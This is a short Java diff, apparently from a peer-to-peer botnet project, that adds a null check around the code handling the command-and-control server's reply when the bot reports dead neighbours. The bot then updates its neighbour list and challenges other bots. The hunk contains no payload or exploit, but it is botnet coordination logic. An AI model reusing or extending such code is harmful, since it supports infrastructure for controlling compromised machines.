@@ -550,17 +550,22 @@ public class Behavior {
 		List<Pairs<String, String>> response = null;
 		response = req.sendDeadNeighToCeC(nServ.getCommandConquerIps().get(0).getValue1().toString(), nServ.getIdHash(),
 				listDeadNegh);
-		newNeighbours = nServ.tramsuteNeigha(response);
-		if (newNeighbours != null) {
-			newNeighbours.forEach(ob -> System.out.println("Vicinato convertito " + ob.getValue1().toString()));
-		} else
-			System.out.println("Risposta vicini senza elementi");
+		if(response!=null){
+			newNeighbours = nServ.tramsuteNeigha(response);
+			if (newNeighbours != null) {
+				newNeighbours.forEach(ob -> System.out.println("Vicinato convertito " + ob.getValue1().toString()));
+			} else
+				System.out.println("Risposta vicini senza elementi");
 
-		SyncIpList<IP, PublicKey> buf = nServ.getNeighbours();
-		buf.setAll(newNeighbours);
-		nServ.setNeighbours(buf);// TODO controllare se serve veramente
-		System.out.println("Avviso i mie vicini di conoscerli");
-		challengeToBot();
+			SyncIpList<IP, PublicKey> buf = nServ.getNeighbours();
+			buf.setAll(newNeighbours);
+			nServ.setNeighbours(buf);// TODO controllare se serve veramente
+			System.out.println("Avviso i mie vicini di conoscerli");
+			challengeToBot();
+		}else{
+			System.out.println("Errore invio morti al CeC");
+		}
+	
 	}
 
 	public P2PMan getpServ() {
